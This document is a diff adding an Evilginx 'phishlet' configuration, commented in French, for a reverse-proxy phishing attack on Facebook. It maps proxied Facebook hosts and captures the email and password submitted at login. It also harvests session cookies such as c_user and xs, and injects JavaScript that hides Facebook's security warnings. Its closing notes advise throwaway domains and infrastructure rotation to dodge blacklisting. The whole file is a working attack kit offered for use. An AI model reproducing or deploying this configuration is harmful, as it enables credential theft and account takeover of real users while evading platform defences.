@@ -1,0 +1,196 @@
+##########################################################
+# PHISHLET FACEBOOK - EVILGINX PRO
+# Configuration pour Facebook.com
+##########################################################
+
+name: "facebook"
+author: "@breakdev"
+min_ver: "3.0.0"
+
+##########################################################
+# PROXY HOSTS
+##########################################################
+proxy_hosts:
+  # Facebook principal
+  - phish_sub: "www"
+    orig_sub: "www"
+    domain: "facebook.com"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  # Login mobile
+  - phish_sub: "m"
+    orig_sub: "m"
+    domain: "facebook.com"
+    session: true
+    is_landing: false
+
+  # Ressources statiques
+  - phish_sub: "static"
+    orig_sub: "static"
+    domain: "xx.fbcdn.net"
+    session: false
+    is_landing: false
+
+  - phish_sub: "scontent"
+    orig_sub: "scontent"
+    domain: "xx.fbcdn.net"
+    session: false
+    is_landing: false
+
+##########################################################
+# SUB FILTERS
+##########################################################
+sub_filters:
+  # Facebook principal
+  - triggers_on: "www.facebook.com"
+    orig_sub: "www"
+    domain: "facebook.com"
+    search: "www.facebook.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "www.facebook.com"
+    orig_sub: "www"
+    domain: "facebook.com"
+    search: "https://www.facebook.com"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json"]
+
+  - triggers_on: "www.facebook.com"
+    orig_sub: "www"
+    domain: "facebook.com"
+    search: '"facebook.com"'
+    replace: '"{domain}"'
+    mimes: ["application/json"]
+
+  # Mobile
+  - triggers_on: "www.facebook.com"
+    orig_sub: "m"
+    domain: "facebook.com"
+    search: "m.facebook.com"
+    replace: "{hostname}"
+    mimes: ["text/html"]
+
+  # CDN
+  - triggers_on: "www.facebook.com"
+    orig_sub: "static"
+    domain: "xx.fbcdn.net"
+    search: "static.xx.fbcdn.net"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+##########################################################
+# AUTH TOKENS
+##########################################################
+auth_tokens:
+  # Cookies de session Facebook
+  - domain: ".facebook.com"
+    keys:
+      - "c_user" # User ID
+      - "xs" # Session token
+      - "datr" # Device token
+      - "sb" # Secure browsing
+      - "fr" # Facebook request token
+      - "presence" # Online presence
+      - "wd" # Window dimensions
+
+  - domain: ".www.facebook.com"
+    keys:
+      - "c_user"
+      - "xs"
+
+##########################################################
+# CREDENTIALS
+##########################################################
+credentials:
+  # Email ou téléphone
+  username:
+    key: "email"
+    search: "(.*)"
+    type: "post"
+
+  # Mot de passe
+  password:
+    key: "pass"
+    search: "(.*)"
+    type: "post"
+
+##########################################################
+# LOGIN
+##########################################################
+login:
+  domain: "www.facebook.com"
+  path: "/login"
+
+##########################################################
+# FORCE POST
+##########################################################
+force_post:
+  - path: "/login/device-based/regular/login"
+    search:
+      - { key: "email", search: "(.*)" }
+      - { key: "pass", search: "(.*)" }
+    force:
+      - { key: "email", value: "{email}" }
+      - { key: "pass", value: "{pass}" }
+      - { key: "login", value: "1" }
+    type: "post"
+
+##########################################################
+# JS INJECT (Pro)
+##########################################################
+js_inject:
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login", "/"]
+    script: |
+      // Contournement détection Facebook
+      console.log('Facebook phishing active');
+
+      // Masquer les avertissements de sécurité
+      setTimeout(function() {
+        var warnings = document.querySelectorAll('[role="alert"]');
+        warnings.forEach(function(el) {
+          if (el.textContent.toLowerCase().includes('unusual') || 
+              el.textContent.toLowerCase().includes('verify')) {
+            el.style.display = 'none';
+          }
+        });
+      }, 1000);
+
+##########################################################
+# AUTH URLS
+##########################################################
+auth_urls:
+  - "/login"
+  - "/login.php"
+  - "/login/device-based/regular/login"
+  - "/checkpoint"
+  - "/checkpoint/block"
+
+##########################################################
+# LANDING URLS
+##########################################################
+landing_urls:
+  - "/"
+  - "/home.php"
+  - "https://www.facebook.com"
+##########################################################
+# NOTES
+##########################################################
+# Facebook a des protections anti-phishing très avancées :
+# - Device fingerprinting sophistiqué
+# - Location verification
+# - Behavioral analysis
+# - Machine learning detection
+#
+# Ce phishlet capture :
+# - Email/téléphone et password
+# - Tokens de session (c_user, xs)
+# - Device tokens (datr)
+#
+# ⚠️ ATTENTION : Facebook détecte et bloque rapidement
+# Les domaines de phishing sont souvent blacklistés en <24h
+# Utiliser des domaines jetables et rotation d'infrastructure
+##########################################################
